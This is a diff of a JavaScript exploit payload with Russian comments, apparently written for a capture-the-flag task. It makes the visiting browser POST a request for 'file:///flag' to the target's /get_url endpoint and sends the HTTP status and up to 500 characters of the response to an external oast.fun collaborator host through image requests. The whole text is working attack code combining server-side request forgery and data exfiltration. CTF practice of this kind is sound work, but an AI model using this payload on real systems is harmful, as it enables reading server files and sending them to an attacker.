@@ -3,23 +3,29 @@
 const TARGET = 'https://tasks.goidactf.ru:20185';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// Создаём FormData
-const formData = new FormData();
-// НЕ РАБОТАЕТ - FormData создаёт multipart/form-data
-
-// Вместо этого используем Blob с правильным Content-Type
-const blob = new Blob(
-    [JSON.stringify({url: 'file:///flag'})],
-    {type: 'application/json'}
-);
-
+// XMLHttpRequest может отправить application/json
 const xhr = new XMLHttpRequest();
-xhr.open('POST', TARGET + '/get_url');
-xhr.send(blob);
+xhr.open('POST', TARGET + '/get_url', true);
+xhr.setRequestHeader('Content-Type', 'application/json');
 
 xhr.onreadystatechange = function() {
     if (xhr.readyState === 4) {
-        new Image().src = COLLAB + '/?blob_status=' + xhr.status;
+        // Отправляем статус на коллаборатор
+        new Image().src = COLLAB + '/?xhr_status=' + xhr.status + '&ready=' + xhr.readyState;
+        
+        // Если получили ответ (даже если CORS блокирует чтение)
+        if (xhr.status === 200) {
+            // Пробуем прочитать
+            try {
+                const response = xhr.responseText;
+                if (response) {
+                    new Image().src = COLLAB + '/?xhr_response=' + 
+                                     encodeURIComponent(response.substring(0, 500));
+                }
+            } catch(e) {}
+        }
     }
 };
+
+xhr.send(JSON.stringify({url: 'file:///flag'}));
 </script>
